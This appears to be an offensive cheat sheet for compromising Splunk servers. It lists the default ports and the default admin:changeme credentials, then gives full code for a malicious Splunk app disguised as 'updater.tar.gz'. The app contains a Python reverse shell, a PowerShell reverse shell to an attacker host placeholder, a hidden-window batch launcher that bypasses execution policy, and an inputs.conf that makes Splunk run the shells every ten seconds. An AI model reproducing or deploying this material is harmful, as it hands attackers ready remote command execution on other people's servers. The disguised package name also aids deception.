# Discovery & Enumeration
- Default port: 8000 and 8089
- Default credentials -> admin:changeme

# RevShell
1. Create a rev.py in /bin directory
python:
```
import sys,socket,os,pty

ip="attacker-ip-here"  
port="attacker port here"  
s=socket.socket()  
s.connect((ip,int(port)))  
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')  
```
2. Create a run.ps1 in /bin directory
powershell:
```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('attacker_ip_here',attacker_port_here);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

3. Create a run.bat in /bin directory
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

4. Create a inputs.conf in /default directory
```
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

5. Create tar file
```
tar -cvzf updater.tar.gz splunk_shell/
```
